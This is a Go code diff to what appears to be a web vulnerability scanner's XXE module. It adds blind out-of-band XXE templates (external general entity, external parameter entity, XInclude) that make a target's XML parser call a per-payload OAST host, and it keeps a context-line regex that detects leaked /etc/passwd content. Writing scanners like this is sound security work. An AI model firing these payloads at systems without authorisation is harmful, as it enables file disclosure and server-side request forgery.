@@ -25,6 +25,47 @@ import (
 // (a Salesforce community 404 shell whose inline CSS carried "--dxp-g-root:").
 var passwdLineRe = regexp.MustCompile(`root:[^:\r\n]{0,64}:0:0:`)
 
+// injectionTypeXXE is recorded on the OAST payload context for the blind/OOB
+// leg. It contains the word "xxe" so the OAST service classifies the resulting
+// callback via oast.classifyXXE (a correlated hit on the unguessable per-payload
+// subdomain is itself proof the XML parser resolved the external reference).
+const injectionTypeXXE = "xxe (external entity)"
+
+// oobURLToken is the placeholder replaced with the per-payload OAST http:// URL
+// in each blind-XXE template. A literal token + strings.ReplaceAll is used rather
+// than fmt.Sprintf so the DTD's own '%' parameter-entity syntax needs no escaping.
+const oobURLToken = "__VIGOLIUM_OAST__"
+
+// oobXXEPayloads are blind / out-of-band XXE templates. Each references a unique
+// per-payload OAST URL; the target's XML parser fetching that external
+// entity/DTD (an out-of-band callback to an unguessable subdomain) is unforgeable
+// proof it resolves external references, so no in-band marker — and no response
+// inspection — is needed. This is the dominant modern XXE case (blind parsers,
+// XXE-behind-a-firewall, XXE→SSRF) that the in-band file:// probes above miss.
+var oobXXEPayloads = []struct {
+	tmpl string
+	desc string
+}{
+	{
+		// External general entity referenced in the document body: the parser must
+		// dereference the SYSTEM URL to expand &xxe; — also the XXE→SSRF shape.
+		tmpl: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + oobURLToken + `">]><root>&xxe;</root>`,
+		desc: "external general entity (XXE→SSRF)",
+	},
+	{
+		// External parameter entity dereferenced in the internal subset: the classic
+		// blind-XXE shape that fires even when the entity value is never reflected.
+		tmpl: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "` + oobURLToken + `"> %xxe;]><root>ok</root>`,
+		desc: "external parameter entity (blind XXE)",
+	},
+	{
+		// XInclude pointing at a remote resource: reaches parsers that disable DTDs
+		// but leave XInclude enabled.
+		tmpl: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="` + oobURLToken + `" parse="text"/></foo>`,
+		desc: "XInclude remote fetch",
+	},
+}
+
 // xxePayload defines an XXE test case. A success is confirmed by a specific
 // literal marker (markers) and/or a structural marker (markerRe) appearing in the
 // response but NOT in the unfuzzed baseline.
@@ -134,6 +175,12 @@ func (m *Module) ScanPerRequest(
 		return nil, nil
 	}
 
+	// Blind / out-of-band leg: plant external-entity payloads referencing unique
+	// OAST subdomains. Findings arrive asynchronously via the OAST callback
+	// (oast.classifyXXE) — a correlated hit is proof, so there is nothing to
+	// inspect in-band here. Fire-and-forget before the in-band probes below.
+	m.scanBlindXXE(ctx, httpClient, scanCtx, urlx.String())
+
 	// Get original response body
 	var origBody string
 	if ctx.Response() != nil {
@@ -202,6 +249,49 @@ func (m *Module) ScanPerRequest(
 	}
 
 	return results, nil
+}
+
+// scanBlindXXE plants the out-of-band external-entity payloads. Each payload gets
+// its own unguessable OAST subdomain; the target's XML parser fetching it produces
+// a correlated callback that the OAST service turns into a finding (classifyXXE),
+// so this sends fire-and-forget and never inspects the (blind) response. A no-op
+// when OAST is disabled — the module then relies on its in-band probes alone.
+func (m *Module) scanBlindXXE(ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester, scanCtx *modkit.ScanContext, target string) {
+	oast := scanCtx.OASTProv()
+	if oast == nil || !oast.Enabled() {
+		return
+	}
+
+	requestHash := ctx.Request().ID()
+	for _, p := range oobXXEPayloads {
+		host := oast.GenerateURL(target, "body", injectionTypeXXE, ModuleID, requestHash)
+		if host == "" {
+			return
+		}
+		payload := strings.ReplaceAll(p.tmpl, oobURLToken, "http://"+host)
+		// Record the exact XML planted so the finding reconstructs what went on the
+		// wire rather than a bare callback host.
+		oast.RecordPayload(host, payload)
+
+		modifiedRaw, err := httpmsg.SetBody(ctx.Request().Raw(), []byte(payload))
+		if err != nil {
+			continue
+		}
+		modifiedRaw, err = httpmsg.AddOrReplaceHeader(modifiedRaw, "Content-Type", "application/xml")
+		if err != nil {
+			continue
+		}
+
+		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())
+		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
+		if err != nil {
+			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
+				return
+			}
+			continue
+		}
+		resp.Close()
+	}
 }
 
 // checkXXEMarkers checks whether the response body contains an XXE success
